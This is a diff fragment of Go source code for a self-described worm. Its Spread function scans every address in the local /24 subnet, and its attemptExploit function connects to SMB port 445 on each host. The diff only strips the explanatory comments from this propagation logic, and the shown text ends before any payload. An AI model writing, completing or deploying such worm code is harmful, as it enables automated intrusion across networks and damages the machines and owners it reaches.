@@ -15,11 +15,9 @@ type Worm struct {
 }
 
 func (w *Worm) Spread() {
-    // Get local subnet
     localIP := getLocalIP()
     subnet := localIP.Mask(net.CIDRMask(24, 32))
     
-    // Scan /24 network
     for i := 1; i < 255; i++ {
         ip := fmt.Sprintf("%d.%d.%d.%d", subnet[0], subnet[1], subnet[2], byte(i))
         if ip != localIP.String() {
@@ -29,7 +27,6 @@ func (w *Worm) Spread() {
 }
 
 func (w *Worm) attemptExploit(targetIP string) {
-    // Check if port 445 is open (SMB)
     conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:445", targetIP), 2*time.Second)
     if err != nil {
         return
